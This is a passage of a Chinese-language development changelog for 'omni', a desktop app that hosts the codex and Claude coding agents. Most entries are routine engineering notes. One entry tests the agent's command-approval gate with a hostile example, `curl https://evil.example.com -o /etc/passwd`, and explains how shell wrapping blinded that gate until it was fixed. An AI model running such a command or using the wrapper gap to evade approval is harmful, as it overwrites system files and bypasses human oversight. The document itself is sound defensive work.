「差异化所在」。**README 里写着、代码里抛错，这本身就是在撒谎。**

### 传结论，不传上下文

新包 `@omni/handoff`，纯函数，从 transcript 里提炼：目标、追加的要求、
改动过的文件（同文件合并计数）、成功执行过的命令（去重）、人工裁决过的事、
最后一份计划里没做完的项。

不搬原始上下文的理由不只是「各家格式不通」——**原始上下文里绝大部分是过程噪声**
（试错、被拒的调用、读了一半的文件），换一家从头看反而更慢。
这也是人交接工作的方式：不会把自己三天的浏览记录发给同事。

交接文案里三条讲究，都是防止接手的一家会错意：

- 开头就说清**「你是接手的」**。不说的话模型会把这段当成用户的普通陈述，
  然后礼貌地复述一遍，而不是接着干。
- **「改动已经落盘，不要重做」**。不说的话它会把「改过的文件」当成待办再改一次。
- **「已经裁决过的不要重新征求同意」**。人工裁决成本最高，
  换一家之后重来一遍是这个功能最容易让人放弃的地方。

### transcript 在渲染层，宿主怎么拿到

宿主手上没有 items——它们在渲染层的 store 里。但宿主有日志：
把事件回放一遍过**同一个归约器**就得到同一份 items。

**这正是「事件流是真源、归约器是纯函数」这条设计换来的**：
不需要为宿主再维护一份 transcript 副本，也就不会出现两份对不上。
当初那个决定在这里第一次付了息。

### 两个必须写死的顺序

- **先停旧的再起新的。** 两个引擎同时对着一个工作区写，是最难查的一类冲突。
- **旧引擎的会话句柄要清掉。** 留着的话，下次续跑会拿 codex 的 thread id
  去问 Claude。

### 验证

让 codex 给 `add` 加一行 JSDoc，40 秒后接力给 Claude。Claude 接手后：
核对工作区（`git status` + 读文件）→ 明确说「工作区与交接内容一致，无需重做」→
指出「尚未完成的部分：没有了」→ **`mul` 一个字没动** → 列出可选的下一步
并说明「都需要你点头，我没有自作主张去做」。

这正是设计想要的行为：**接手的一家核对，而不是重复**。

顺带把 `host.ts` 按职责拆了（322 行撞闸门）：`ctx.ts` 事件出口与共享状态、
`session.ts` 一个会话怎么活、`approval.ts` 审批怎么问怎么记、
`host.ts` 只剩命令分派与收场。

## 打包成能装的 app · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（318 cases）+ 从 DMG 装出来两家引擎都跑通

在这之前 omni 只能从开发目录跑。**一个只能在 checkout 里跑的东西不算产品。**

图标自己做：SVG → headless 截图 1024 → `sips` 出各档尺寸 → `iconutil` 打 icns。

### 只有真打包才撞得出来的 bug

打完第一版，codex 跑得好好的，**Claude 引擎报 `spawn ENOTDIR`**。

`subprocess.ts` 里（所有引擎共用的那个 spawn 口），不放在 Claude 驱动里：
将来任何一家自带可执行文件的引擎都会撞上同一件事。

这也是「打包必须进 CI 的构建步骤」的理由之一。

顺带一提，这次故障是**被界面正确报出来的**——红色横幅写着 `spawn ENOTDIR`，
空状态说「没有可用的会话」。之前那轮「引擎故障必须看得见」在这里兑现了。

**遗留**：应用 576 MB / DMG 208 MB，主要是 Electron 运行时加 Claude SDK 自带的 CLI。
没有签名与公证，首次打开要手动放行。

## `@` 文件引用 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（314 cases）+ 真实仓库索引验证

新包 `@omni/worksite`：工作区文件索引 + 模糊搜索。

**放在引擎之外是有意的。** codex 有 `fuzzyFileSearch`，Claude 没有——
真按引擎各做一份，两家的排序质量就会不一样，用户会觉得
「换个内核连搜文件都变了」。`@` 引用文件是**工作区**的事。

不用现成的 fuzzy 库：它们大多为「短列表 + 单词」调优，而这里排的是**路径**。
路径有自己的规律，最重要的一条是**文件名比目录名重要得多**。

### 真实数据一跑就暴露的两个排序错误

对着 omni 自己的仓库搜 `host`（3ms 索引完 + 零 `node_modules` 命中）：

1. `packages/host/README.md` **排在** `packages/host/src/host.ts` 前面。
   原因：**贪心咬住第一个匹配就再也回不了头**——两者都在目录段 `host/` 上
   匹配完了，于是只剩路径长度在比，README 更短就赢了。文件名里的那个 `host`
   根本没被看见。补一趟**只针对 basename** 的匹配，取两者中高的那个。
2. 修完之后 `host.ts` 仍排在 `host.test.ts` 后面——基础分一模一样，
   只剩路径长度在比，而那和「谁更像你要找的」无关。
   加一条：**文件名里多出来的字符要扣分**。

两条都写成了回归用例。这类问题在造出来的测试数据上永远不会出现——
必须拿真仓库跑。

### 其他决定

- **`node_modules` 这类目录永远不进索引。** 不是优化：一个目录几十万文件，
  不排除的话第一次索引就把界面挂在那里，而里面没有一个是用户想 `@` 的。
- 上限 2 万文件 / 12 层深，到顶就停。`@` 不该变成一次全盘扫描。
- **搜索结果要核对序号**：打字比磁盘快，先发的请求后回来是常态，
  不核对的话列表会闪回旧结果。
- 候选列表悬在输入框**上方**——输入框已经贴着窗口底边，往下弹会被裁掉。
- 列表项用 `mousedown` 而不是 `click`：`click` 之前输入框会先失焦，
  失焦把列表关掉，于是这一下点了个空。

## 审批记忆落盘，「始终允许」回来了 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（288 cases）

审批卡那一轮**砍掉过**「始终允许」，理由是 project 级规则要写盘而 `@omni/journal`
当时还不存在——「宁可少一个选项，也不要一个点了不生效的按钮」。现在把它补齐。

**规则和事件分开存。** 它们的生命周期完全不同：事件是**某一次会话**的流水，
规则是**某个工作区**的长期设置。删掉会话不该把「始终允许」一起删了。
文件名用工作区路径的哈希——路径可以很长、带中文和空格，
把它转义进文件名的话，转义规则一旦要改旧文件就全读不出来了。

三处必须想清楚的语义：

- **`session` 只进内存不写盘。** 它的意思就是「这个会话内不再问」；
  落盘会让下次启动莫名其妙地少了几次询问。
- **只有放行才记忆。** 记住一次拒绝没有意义——下次同样的请求还是该问。
- **规则文件坏了当成「没有规则」，不能当成「全部允许」**，也不该让会话起不来。

`StartRequest.memory` 从数组改成**取值函数**。用户在会话中途勾了「本对话不再问」，
新规则必须对**接下来的**判定立刻生效；传一份快照进去的话，
驱动会一直拿着开会话那一刻的旧清单。

`ApprovalAsk` 现在带**完整的建议规则**而不只是一句 `rememberHint`——
用户勾了之后宿主要存的是规则本身，光有描述存不了。

界面上「始终允许」推到操作行最左，和「允许一次」隔开：
它是三档里影响最大的一个，不该挨在一起让人手滑。
判定器给不出可记忆规则时这个按钮**不出现**——摆一个点了什么也没记住的按钮，
比没有这个选项糟得多。

## 判定器对 codex 的命令一直是失明的 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（288 cases）+ 对照探测

做「审批记忆落盘」时顺手想了一下：勾「始终允许」之后到底存了什么签名？
一查发现问题比想象大得多。

codex 把**每一条**命令包成 `/bin/zsh -lc '真正的命令'`。分词器于是只看到
`["/bin/zsh", "-lc", "真正的命令整串"]`。实测对照
（`curl https://evil.example.com -o /etc/passwd`）：

| | hosts | paths | signature |
| --- | --- | --- | --- |
| 裸命令 | `["evil.example.com"]` | `["/etc/passwd"]` | `["curl"]` |
| 包壳后 | `[]` | `[]` | `["/bin/zsh"]` |

三个后果，一个比一个重：

1. **「访问外部网络」这类红线对 codex 的每一条命令都失明**——host 永远是空的。
2. **「写到工作区外」同理**——path 永远是空的。
3. 记忆签名是 `/bin/zsh`。也就是说勾一次「始终允许」，
   **今后所有 shell 命令都会被自动放行**。

修在 `splitSegments()` 里，不修在 codex 驱动里：任何一家用包壳的引擎都会遇到
同一个问题，修在共同的解析入口上才不用每接一家补一次。剥壳放在 `OPAQUE_PATTERNS`
检查**之前**——藏在引号里的 `$(...)` 也必须被认出来，有用例守着。
只剥一层：嵌套包壳本身就该人工看。

这个洞从 codex 驱动落地那天就在。它没被更早发现，是因为之前的用例都用裸命令构造——
**测试用例长得不像真实数据，就守不住真实的漏洞**。

## IPC 合帧：5000 行输出不再压垮界面 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（265 cases）+ 5000 行洪水验证

codex 的命令输出是**一行一条通知**。逐条过 IPC 意味着：上万次跨进程序列化 +
上万次 React 重渲染，而归约器每次都要复制一遍整条 item 列表。
这是个真实的性能悬崖，不是理论上的。

主进程加一层合帧：16ms 一批（≈ 一帧，人感知不到），渲染层一批一次 `setState`。
一秒上千条压成 60 批。

两条边界条件写进了实现：

- **攒满 500 条立刻发，不等窗口。** 没有这条的话，一个疯狂刷屏的命令会在 16ms 里
  攒出几万条，一次性过 IPC 反而更卡——**合帧是为了少发几次，不是为了攒大包**。
- **发之前先把队列换掉。** `send` 里如果又推了事件进来，不能掺进正在发的这一批。
  有用例守着。

回放历史时要 `flush()`：那一次要灌进去几百上千条，攒着没有意义，
而且最后一批不 flush 就得等窗口到期。

**顺序绝不能乱、一条都不能丢**——合帧只改变「什么时候发」，不改变发什么。
用例里跑了 50 条按序断言。

验证：让 codex 前台跑 `seq 1 5000 | awk ...`，5000 行刷完界面照常响应，
轮次干净收工。

## 中断：把一个只做了一半的功能补完 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（257 cases）+ 真实中断验证

状态行上那个「停止」按钮从来没被真的验证过。加了 `OMNI_DEV_INTERRUPT` 钩子
跑了一次——**结果是只做了一半**。

命令确实停了（输出停在步骤 17，进程被杀），轮次也确实结束了（状态行消失、
侧栏转灰）。但那条工具行**永远停在 `running`**：界面上是一个转到天荒地老的转圈，
而实际上进程早就没了。

原因：**中断时 codex 不会给在途的 `commandExecution` 补 `item/completed`**。
翻了一下 Claude 驱动，**同一个洞**——中断或出错时不会再有 `tool_result` 回来，
`ref.tools` 里那些也一样挂着。两边都补了「轮次异常收工时清扫在途工具」。

顺带在协议上加了一档 `ToolStatus.interrupted`。这不是锦上添花：
被中断的调用既没成功也没失败，更不是被拒。一律写成 `failed` 会让
**「你自己按了停止」看起来像「它出错了」**。界面上用中性灰，不是红色。

清扫时只碰**已经落地过**的 item——没落地的补一条，等于凭空多出一行
界面上从来没出现过的工具调用。有用例守着。

## 代码块语法高亮 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（252 cases）+ 真实会话验证

Markdown 那一轮留下的洞。

**底线没动：不产出 HTML 字符串。** `highlight.js` 直接生成 HTML 再
`dangerouslySetInnerHTML` 那条路"实际上"也安全（hljs 自己会转义），
但它把安全性重新变成「某个环节做对了」，而不是「结构上不可能」。
走 `lowlight`——它返回 hast 元素树，直接挂回文档树。
这和 `Markdown.tsx` 里那条「永远不要 `rehype-raw`」是同一条底线。

### 为什么最后没用 `rehype-highlight`

先用了它，vendor 块从 573 KB 涨到 **955 KB**。翻源码找到原因：
它在模块顶层写着 `import {common} from 'lowlight'`——
**35 种「常见」语言无条件进包**，传 `languages` 选项只是往注册表上再加，
减不掉已经打进去的那些。而里面一多半（Perl、PHP、Objective-C…）
在这个界面上一辈子不会出现。

自己写了 40 行的 rehype 插件直接用 lowlight，只注册 12 种编程 agent 真的会吐出来的
语言。vendor 落到 **709 KB**——高亮的净成本从 382 KB 降到 136 KB。

两个小决定：
- **没标语言就不猜**。`highlightAuto` 猜错的高亮比没有高亮更碍眼，
  而模型标语言的比例本来就很高。
- **行内 code 不高亮**。一句话里插一段彩色反而更难读。

配色自己写，不引 hljs 的现成主题：那些主题自带背景色和字号，
会把代码块从这套界面里「抠」出来。只染字色，四档（关键字/字符串/数字/标题）
拉开就够读——全彩会让一屏代码变成圣诞树。

## 会话删除 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（243 cases）+ 样张验证

会话此前只增不减：磁盘一直涨，侧栏迟早没法看。

**顺序是这个 feature 的全部内容**：先落定挂着的审批 → 再 `dispose()` → 最后才删文件。
反过来的话，一个还在等审批的驱动会卡在那里，而它的日志文件已经没了——
**之后它写的每一条都会把文件重新建出来，删除等于没删**。
写了一个用例把这个顺序钉住：journal 的 `remove` 里断言驱动必须已经处置完。

`thread.removed` **故意不落盘**：文件都删了，再写一条只会把它建回来。

归约器那边要清的不止 `threads`：`owner` / `turnOwner` 两张反查表也得清。
留着的话，一条迟到的 `item.updated` 会把内容写回一个已经不存在的会话，
那份数据从此再也删不掉。也有用例守着。

二次确认做在**同一个按钮**上而不是弹对话框：删一个会话不值得打断整个界面，
但也不能点一下就没。照 codex 的 `confirmArchiveTask`。
删除按钮平时 `opacity: 0`——不可撤销的操作不该一直待在手边。

## ⌘F 会话内查找 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（234 cases）+ 真实会话验证

用 Chromium 原生的 `findInPage` 而不是自己在 item 模型上匹配。理由不是省事：
transcript 里有 Markdown 渲染出来的元素树、代码块、diff，自己做匹配就要自己做
高亮和滚动定位，而且**永远追不上渲染层的变化**——每加一种呈现形态就要补一次。

### 一条文档里没有的行为

第一版跑出来查找条永远显示 `0/0` 并标红，像一个字都没匹配上。
写了个最小 Electron 脚本单独探它，结果很干脆：

```
A findNext:false  → 超时，没有任何 found-in-page 事件
B findNext:false  → 超时
C findNext:true   → matches: 3，立刻返回
D findNext:false  → 正常返回
```

**`findNext: false`（新建搜索）在没有活跃会话时不发事件**，要等一个会话存在了才报数。
文档里没有这条。所以现在**一律传 `findNext: true`**，「从头开始找」用先
`stopFindInPage` 清掉会话来表达——效果一样，而且真的会报数。

`found-in-page` 还必须按 requestId 对上：按住回车连发时，不对 id 就会把上一次的
计数当成这一次的。

### 一个不打算修的取舍

`findInPage` 搜的是**整个窗口**，所以侧栏的会话预览、查找框自己的输入值也算命中。
探过能不能排掉查找框——`display:none` / `visibility:hidden` /
`content-visibility:hidden` / `inert` 里的内容确实不计入（逐个测过），
但这四种都会让输入框**不可输入**。中文 IME 需要一个真正获得焦点的 input，
**为一个计数牺牲中文输入不划算**。保留，并在计数上挂 tooltip 把这件事说出来。

计数用 `n/总数` 而不是「找到 N 条」：知道自己在第几条才敢一直按回车。
Enter 下一个、Shift+Enter 上一个、Esc 关闭——和所有编辑器一致，不发明新的。

## 渲染层崩了也要说得出话 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（228 cases）+ 故意制造崩溃验证

React 的默认行为是：任何一个组件抛异常，**整棵树被卸载**，屏幕一片空白。
对用户来说这和「应用死了」没有区别，而且不留任何线索——
引擎其实还活着、日志也还在，但他什么都看不到、什么都做不了。

补一个错误边界（**只有类组件能做，React 至今没有 hook 版本**）：说出错在哪、
给一条能自己走出去的路（重载窗口），并把栈摆出来但压得很淡——
它是给能读它的人看的，不该吓住其他人。文案里明说「引擎进程还活着，
会话记录也已经落盘」，因为那是真的，也是用户此刻最需要知道的事。

**一个白屏加一句「请重启」不是生产级；一个说得出哪里炸了、点一下能回去的界面才是。**

顺带补上一个可观测性的洞：渲染层的 `console` 默认**只进 DevTools**。
打包之后没人开 DevTools，于是「界面崩了」这件事在日志里一点痕迹都没有。
主进程挂 `console-message` 把 error/warning 转发到 stderr——
验证时确认了两条都在：React 自己抛的那条，和错误边界自己打的那条。

## 会话续跑：把「历史记录」变回能用的会话 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（228 cases）+ 跨进程记忆验证

上一个 feature 之后，重启能看到历史，但那是**只读的**。这一个把引擎接回来。

两家都支持，但都需要**引擎自己的会话句柄**：codex 是 `thread/resume { threadId }`
（它自己的 thread id），Claude 是 `query({ options: { resume: sessionId } })`。
所以 `Thread` 新增 `engineHandle`，omni **只负责原样存取，不解释它**。

**句柄必须走 `thread.updated` 而不是私存一份**——那样它才会跟着事件流落盘，
和历史存在同一个地方。分开存的话，总有一天会出现「历史在但句柄丢了」。

`onHandle` 做成回调而不是返回值，是因为 **Claude 的 session id 在
`system/init` 消息里才到达**，比 `start()` 返回晚。

### 第一次跑真实会话就现形的时序 bug

落盘里根本没有 `engineHandle`。原因：codex 在 `start()` **里面**就知道自己的
thread id 并回调了 `onHandle`，而那时 `ctx.live` 还没有这条会话——
`rememberHandle` 直接扑空返回。

修法不是「把登记提前」（拿不到 session 对象），而是让 `launch()` 把
**登记完成之前到达的句柄**返回给调用方，由调用方在发完 `thread.started`
之后再补一条 `thread.updated`。顺序因此是 started → updated；
反过来的话落盘里就成了「先更新后创建」。加了回归用例把这个顺序钉住。

### 拒绝静默降级

续跑失败（历史被清、句柄缺失、版本不兼容）**不能悄悄退化成新会话**。
那样界面看起来像接上了，实际模型对上面那段对话一无所知——
**起一个全新会话却看着像接上了，是最坏的结果**。所以没有句柄就直接报错。

### 验证方式

不看截图里有没有内容，而是设计了一个**只有真的恢复了记忆才能通过**的测试：

1. 第一个进程：「请记住这个编号：QX-4287」
2. 杀掉，起第二个进程，续跑，问：「我刚才让你记住的编号是多少？」
3. 答：`QX-4287`

那个编号只存在于第一个进程的对话里。

## 事件落盘：重启之后会话还在 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（221 cases）+ 跨两次启动真实验证

在这之前关掉窗口 = 一切消失。新包 `@omni/journal`，一个会话一个 JSONL，追加式。

**为什么是追加事件而不是存状态快照**：事件流本来就是真源，而 `@omni/store` 的归约器
是纯函数——回放一遍就能得到当时的界面状态。不需要第二套序列化逻辑，
也就不会出现「快照和事件对不上」这类问题。

三个刻意的取舍：

- **`item.delta` 不落盘。** 每条流式 item 最后都有一条 `item.updated` 带完整内容
  （agentMessage 带全文、shell 带完整 aggregatedOutput），回放只认最终值，
  结果一样而文件小一个数量级——一次 `pnpm build` 的输出增量能有几千条。
  代价：回放看不到「逐字冒出来」的过程。
- **`engine.status` 不落盘。** 它描述的是**那一次进程**的状态，
  重启之后再放一遍「引擎已就绪」只会误导人。
- **写入失败一律吞掉并继续。** 磁盘满了、目录被删了，都不该让一个正在跑的会话中断——
  用户宁可丢历史也不愿丢正在进行的工作。

宿主这边最要紧的一处结构改动：**事件的唯一出口**。之前 `emit` 有四五个调用点
（`setStatus`、`create`、`prompt`、`setTrust`、gate、驱动），落盘挂在哪一个上都会漏。
现在全部收口到一个 `emit(ctx, event)`：转发 → 落盘 → 旁路观察。
顺带补了一张 `turnOwner` 表——落盘要按会话分文件，而 `turn.completed` / `item.*`
只带 turn id，而 `Live.turn` 会在轮次结束时被清空，靠不住。

安全上一处小的：`threadId` 拼文件名前过一道正则。id 是我们自己铸的、目前不可能带斜杠，
但**「目前不可能」不是安全依据**——这一步的成本是一次正则，而代价是写到目录外面去。

**回放出来的会话是只读的**，带 `detached: true`。磁盘上有的是历史，引擎那边的对话记忆
不在；直接往下发消息，模型会像没见过前面那些内容一样回答。顶栏标「历史记录」，
输入框关掉并写明原因——**一个能打字却答非所问的输入框比没有输入框糟得多**。
续跑是下一个 feature。

顺带修了一个只有真跑起来才会发现的问题：`app.getPath("userData")` 取的是
`app.getName()`，而它默认读 package.json 的 `name`——于是用户数据落进了
`Application Support/@omni/desktop`。**scoped 包名不该泄漏到用户可见的路径里**，
补了 `productName: "omni"`。

## 引擎故障必须看得见 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（199 cases）+ 三种失败路径真实验证

问了一句「codex 没装的话会怎样」，答案是**三个串起来的生产级 bug**。

### 一、未处理的 `error` 事件把整个进程掀翻

`spawn("codex-does-not-exist")` 时，`ChildProcess` 会发一个 `error` 事件。
没人监听的话它就是未捕获异常——在 Electron 主进程里就是**应用当场退出**。
实测确认：探测脚本直接被 Node 干掉了。

`subprocess.ts` 现在无条件挂 `error` 监听。这不是"加个错误处理"，
这是"不要让程序死"。

### 二、握手会永远等下去

起不来的进程不产出任何 stdout，`rpc.call("initialize")` 于是**永远不 resolve**。
界面就一直停在「正在打开工作区…」——没有报错、没有超时、什么都没有。

补了 20 秒握手超时，但更重要的是让握手和「进程死了」**赛跑**：
起不来这件事在毫秒级就已知，不该让用户干等二十秒。
`ProcessOwner.died()` 返回一个进程出事时 resolve 的 promise。
改完之后同一条路径 **4ms** 给出结论。

报错本身也重写了：`Error: spawn codex ENOENT` 对用户毫无意义，
他要知道的是「装了没、装哪了」。现在是
「找不到可执行文件 `codex`。请确认已安装 codex CLI，且它在 PATH 上
（终端里跑 `which codex` 验证）」。**生产可用的分界线之一就是：
报错必须说得出下一步该干什么。**

### 三、`engine.status` 事件在界面上被整个丢弃

归约器的 `default` 分支把它原样返回了。也就是说引擎起不来、崩了、进程泄漏，
界面上**一律毫无反应**。那不是"还没做的功能"，那是把故障吞掉了。

`crashed` / `timeout` 现在进 `state.notices`，界面上是顶栏下的一条横幅。
`starting` / `ready` / `exited` 不进——它们是正常生命周期。

### 顺带挖出来的第四个

第一次验证时横幅没出来：开机自动建会话那条路径是**裸的 `void promise`**，
只有 IPC 那条有 catch。引擎起不来时它变成一条没人看的未处理拒绝。
现在 `attachHost` 返回一个 `report()`，**每一条通往 `dispatch` 的路都必须经过它**。

还有一个小的：有故障横幅时空状态不能再说「正在打开工作区…」——那是句谎话，
它永远不会打开，用户会一直等下去。**一个会等到天亮的加载提示比一句直白的失败更糟。**

## 上下文用量表 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（194 cases）+ 真实会话验证

生产环境里这不是装饰。会话越长，每次请求带上去的历史越多；撞上窗口上限时模型
开始压缩历史、行为明显变差。**用户需要在撞上之前看见它逼近**，
而不是事后猜「刚才它怎么突然变笨了」。

**最容易拿错的就是那个数。** codex 的 `thread/tokenUsage/updated` 同时给
`total` 和 `last`：

- `total.totalTokens` 是**累计账单**，跨轮累加，实测三轮就从 15k 涨到 47k，
  会一路涨到远超窗口大小——拿它当分子，进度条第三轮就爆表。
- `last.totalTokens` 才是「这次请求占了多少上下文」，也就是离压缩那条线还有多远。

所以 `Usage.contextUsed` 取 `last`，累计另放 `totalTokens` 只进提示文案。
类型注释里把这条区别写死了。

Claude 侧：SDK 的 result 消息带 usage，上下文占用 =
`input + cache_read + cache_creation + output`。**缓存命中必须算进去**——
它省的是钱，不是上下文，那些 token 照样占窗口。

**窗口大小 SDK 不给**（随模型变），所以 `contextWindow` 缺席，界面上只显示数字
不画进度条。照一个猜出来的分母画出来的比例比没有比例更糟：它会让人在还早的时候
以为快满了，或者反过来。这条在 `meterOf` 里有专门的用例守着。

配色上平时是中性灰，七成变提醒色、九成变危险色——一直是彩色的话，
真到危险区就没有升级空间了。

## 新建会话与工作区选择 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（181 cases）+ 真实会话验证

之前**界面上根本没法开新会话**——唯一路径是去换引擎（那条路顺手实现成了
「同工作区另开一个」）。补上侧栏的「＋ 新建会话」与「打开文件夹…」。

**目录选择框必须在主进程弹。** 渲染层没有、也不该有触碰文件系统的能力。
preload 因此加的是一个**窄到只能做一件事**的方法 `pickFolder()`：
它只回一个用户亲手选中的路径，拿不到任何遍历目录的能力。
`ipcRenderer.invoke` 而不是往 Command 联合里塞——那个联合是「请求宿主做事」，
弹个框不属于宿主的编排职责。

**侧栏一行要有 preview。** 同一个工作区可以开好几个会话，光靠目录名它们
长得一模一样。取**第一条用户消息**作预览——codex 的 `Thread.preview`
就是这么定义的。派生放在 store 的 `threadRowsOf` 里，纯函数、可测，
侧栏组件保持哑的。

新会话**沿用当前会话的引擎与档位**：换个工作区不该顺带把内核也换了。

顺带两处：`App` 组件超过 100 行闸门，把 transcript 拆成独立组件（本来就该是）；
文件夹按钮用内联 SVG 而不是字形——`⌸` 在多数字体里会退化成一个含糊的方框，
emoji 又是彩色的、和这套单色界面不搭。内联 SVG 跟着 `currentColor` 走。

## Claude 侧合成 diff · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（178 cases）+ 真实会话验证

上一个 feature 留的洞：codex 给现成的 unified diff，Claude 只给
`old_string`/`new_string`（`Write` 给整份 `content`），所以 Claude 会话里的
文件改动在界面上是一片空白，连展开箭头都没有。

**不做 LCS。** 掐掉首尾相同的行，中间整块按「旧的全删、新的全增」呈现。
对 `Edit` 那种小范围替换，读起来和真 diff 没区别；对一次替换几十行的情况会显得笨，
但**不会说错**——删的确实删了，增的确实增了。上下文各留两行，
不然一个 500 行的文件会把整份内容当上下文贴出来。

写测试时抓到一个真会错的边界：**后缀不能和前缀重叠**。旧文件一行、新文件两行
且第一行相同时，前缀吃掉那一行之后，后缀必须从 0 起算，否则同一行会被同时
算进上下文两端，diff 就多出一行凭空的内容。

`kind` 一律 `update`：**Claude 不告诉我们这个文件此前存不存在**。标 `add` 会在
覆盖已有文件时说假话；标 `update` 在新建时只是不够精确。两种不精确里选后者。

`MultiEdit` 的多处改动合成一条，用 `@@ 第 N 处 @@` 分段——它们本来就是同一个
文件上的同一次操作，拆成多条会让「改了几个文件」这个计数变错。

## Diff 视图：编程 agent 最重要的产出，值得按文件读 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（165 cases）+ 样张 + 真实会话验证

文件改动之前是一坨纯文本塞在 `<pre>` 里。改成结构化呈现，顺带把协议里一个
从一开始就压错的地方掰回来。

**协议：`file_edit` 从单文件改成逐文件。** 一次 `apply_patch` 可以同时改好几个
文件，而 `ToolDetail.file_edit` 只有一个 `path` 加一坨拼接的 `diff`。
拼接之后界面就再也没法按文件分组、按文件折叠、按文件统计了。
新增 `FileChange { path, kind, diff, added, removed }`，`files` 是复数。

**这个压缩在界面上是会说假话的。** 真实会话里 codex 一次改了 `math.js` 与
`index.js` 两个文件，界面上写着「编辑 index.js +4 −0」——只报了第一个。
现在多文件报「2 个文件」，点开逐个列。顺手去掉 `−0`：零不携带信息，只是噪声。

**`kind` 是解析的必需输入，不是润色。** 各家给 `add` / `delete` 时递过来的是
**文件内容本身**，不带任何 `+`/`-` 前缀。照 unified diff 解析的话，一个以
`-- 说明` 开头的 Markdown 新文件会被读成「删除了一行」。`parseDiff(diff, kind)`
的第二个参数因此是必填的。

同类的坑还有一个：`+++ a/x` / `--- b/x` 是文件头，**不是**增删行。
按前缀判断的话每个补丁都会凭空多出一红一绿两行。

排版上三个决定：

- **挤目录不挤文件名。** 整条路径一起 ellipsis，切掉的正是最该看到的那一截
  （`/w/src/mat…`）——扫一列补丁时眼睛找的就是文件名。
- 底色用极淡的绿/红，不是撞色。一屏几十行高亮，饱和度一高整块就没法读。
- 折叠的是**正文不是文件头**：「改了哪些文件」要一眼看到，
  「具体改了什么」才是按需展开的。超过 40 行折叠。

**遗留**：Claude 驱动的 `files` 是空数组——它的 Edit 工具给的是
`old_string`/`new_string` 而不是 diff，要合成。下一个 feature。

## 命令输出实时流 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（152 cases）+ 真实会话验证

一条跑三分钟的命令，之前在界面上只有一行 `running`，输出要等它跑完才一次性出现。
`item/commandExecution/outputDelta` 早就在协议里，只是没接。

探测确认了一件必须确认的事：**这些 delta 拼起来恰好等于收工时那条
`aggregatedOutput`**。所以收工时 `item.updated` 整条替换不会把输出重复一遍。
（如果哪天 codex 改成「delta 是增量、aggregated 是别的东西」，双份输出就是症状，
`notify.ts` 的 `onOutputDelta` 注释里写了这条。）

三处改动：

- `item.delta` 的语义从「只有文本流式 item 吃」扩到「shell 调用的输出也吃」。
  归约器里**留尾不留头**，上限 8000 字符——`pnpm build` 能吐几 MB，
  渲染一个几 MB 的 `<pre>` 会把界面拖垮，而命令跑着时人要看的是它**现在**
  在干什么，不是三分钟前的第一行。
- 工具行在 `running` 期间**自动摊开输出尾部**（8 行），跑完自动收回折叠态。
  要用户先点一下才看得到的进展，等于没有进展。
- 顺手修了状态行的一个信息浪费：codex 把每条命令包成 `/bin/zsh -lc '...'`，
  那 16 个字符会把真正有信息量的部分挤出 48 字符截断线。状态行剥壳，
  工具阶梯保留原样（你得看得见到底执行了什么）。

加了 `OMNI_DEV_TRUST` 开发钩子——验证运行态时常常需要一个不会被审批打断的档位。

## 重做审批卡，补运行态与打包分块 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（146 cases）+ 三态真实会话验证

审批卡与运行态的形制参照 codex 桌面端的交互。加载优化那边参考 `~/work/dsh/apps/web/vite.config.ts`。

（顺带记一笔：`screencapture` 在没授予屏幕录制权限时**不会报错**，
而是静默返回一张只有壁纸、没有任何窗口的图。iTerm/Chrome 都开着却一个窗口都拍不到，
就是这个症状，别当成"窗口在别的 Space"去查。）

### 审批：从「一个勾选框」到「三个真按钮」

原来是 `允许 / 拒绝` + 一个「本项目不再询问」勾选框。两个问题：

1. 布尔表达不了三档。`RememberScope` 早就有 `once | session | project` 三档，
   到了 `ApprovalAnswer.remember` 却被压成 boolean——engine 从此分不出
   「就这一次」和「这轮对话都行」。codex 那边正好对应
   `accept` / `acceptForSession` 两个不同的决定，压成布尔就浪费了。
2. 那个「本项目」是**假的**。project 级要写盘，`@omni/journal` 还不存在。

改成参照 codex 桌面端审批卡的形制：`拒绝` + 带下拉的分体主按钮
`允许一次 ▾ (允许此对话)`。**没有做「始终允许」**——宁可少一个选项，
也不要一个点了不生效的按钮。`ApprovalAnswer.remember` 同步改成 `RememberScope`。

三个细节：

- **快捷键要先问「用户是不是正在打字」**。判据是
  `document.activeElement?.closest("input, textarea, [contenteditable]...")`。
  没有这一句，用户在输入框里敲回车就把审批批了。同一个判据还控制着
  「要不要自动聚焦主按钮」——正在打字就别抢焦点。
- **容器查询而不是媒体查询**。这张卡活在一个宽度会变的栏里，跟视口宽度没关系。
  窄了就按钮竖排拉满、快捷键提示隐藏。
- 快捷键提示做成贴在按钮标签后面的小 chip，窄容器下第一个被丢掉。

还从 dsh 的 `ApprovalPanel` 抄了一条：**正文可滚，操作行在滚动区之外**。
模型给的命令和 diff 长度不受我们控制，不封顶的话一条 200 行的补丁会把
「允许 / 拒绝」顶出屏幕，那时候这张卡就没法用了。

### 运行态：以前是**什么都不显示**

工具行冒出来之前那十几秒，界面上一片空白——分不清它在想还是它已经挂了。
根子在宿主：`Thread.status` 这个字段一直挂在那儿，**从来没有人改过它**，
所以侧栏那个状态点永远是灰的。

宿主接管状态流转（running → waiting_approval → running → idle/failed）。
轮次收工是引擎直接发给渲染层的、宿主看不见，所以在传给驱动的 `emit` 上截了一道。

界面上加一行 `[微光状态文字] [计时器]`：

- 状态文字**说得出在干什么**——「执行 pnpm test」「读取 math.js」「等待批准」，
  而不是一个转圈。codex 的界面把每个加载态都起了名字（正在加载项目…、
  正在加载差异…），是同一个道理：同样一秒钟的等待，知道它在干什么就不焦虑。
- 微光**有节拍**（延迟 600ms / 每道 1000ms / 间隔 4000ms）：
